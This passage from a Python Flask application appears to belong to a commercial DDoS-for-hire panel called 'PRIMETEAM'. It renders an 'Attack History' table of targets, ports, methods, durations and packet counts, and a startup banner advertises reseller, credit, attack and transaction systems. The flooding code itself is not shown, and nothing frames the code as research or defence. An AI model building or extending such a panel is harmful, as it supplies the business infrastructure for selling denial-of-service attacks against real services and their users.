            }}
            th {{ background: rgba(255,0,0,0.2); color: #ff4444; }}
            .btn {{
                background: #00ff88;
                padding: 10px 20px;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                color: #000;
                text-decoration: none;
                display: inline-block;
            }}
            .completed {{ color: #00ff88; }}
            .running {{ color: #ffcc00; }}
            .failed {{ color: #ff4444; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📜 Attack History</h1>
            <a href="/dashboard" class="btn">← Back</a>
            <table>
                <thead>
                    <tr><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Packets</th><th>Status</th><th>Date</th></tr>
                </thead>
                <tbody>
                    {''.join([f'<tr><td>{a.get("target", "N/A")}</td><td>{a.get("port", 0)}</td><td>{a.get("method", "N/A")}</td><td>{a.get("duration", 0)}s</td><td>{a.get("packets_sent", 0):,}</td><td class="{a.get("status", "unknown")}">{a.get("status", "N/A").upper()}</td><td>{a.get("created_at", datetime.now()).strftime("%Y-%m-%d %H:%M:%S") if a.get("created_at") else "N/A"}</td>' for a in attacks]) if attacks else '<tr><td colspan="7" style="text-align:center">No attacks yet</td></tr>'}
                </tbody>
            </table>
        </div>
    </body>
    </html>
    '''

@app.route('/logout')
def logout():
    session.clear()
    return '<script>alert("Logged out!"); window.location.href="/login";</script>'

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    print("=" * 60)
    print("🔥 PRIMETEAM COMPLETE PANEL STARTING 🔥")
    print("=" * 60)
    print("✅ Reseller System Active")
    print("✅ Credit System Active")
    print("✅ Attack System Active")
    print("✅ Transaction System Active")
    print("=" * 60)
    app.run(host='0.0.0.0', port=port, debug=False)